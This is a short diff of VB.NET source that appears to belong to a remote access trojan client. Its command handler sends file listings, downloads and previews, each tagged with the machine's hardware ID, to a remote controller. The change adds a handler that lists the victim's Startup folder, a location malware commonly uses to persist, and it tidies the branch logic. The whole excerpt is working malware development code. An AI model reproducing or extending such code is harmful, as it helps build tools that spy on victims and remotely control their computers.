@@ -112,7 +112,7 @@ cc:
 
                 Case "FM"
                     Send("FM" & SPL & HWID & SPL & FMFolders(A(1)) & FMFiles(A(1)))
-
+                    Exit Select
 
                 Case "DW"
                     If IO.File.Exists(A(1)) Then
@@ -149,6 +149,10 @@ cc:
                         Case "User"
                             Send("FM" & SPL & HWID & SPL & FMFolders(Environ("UserProfile")) & FMFiles(Environ("UserProfile")) & SPL & Environ("UserProfile"))
                             Exit Select
+
+                        Case "Startup"
+                            Send("FM" & SPL & HWID & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Startup))
+                            Exit Select
                     End Select
 
                 Case "PRE"
@@ -165,6 +169,7 @@ cc:
                         Send("PRE" & SPL & HWID & SPL & BS(MM.ToArray))
                         MM.Dispose()
                         TUMB.Dispose()
+                        Exit Select
                     Catch ex As Exception
                     End Try
                     Exit Select
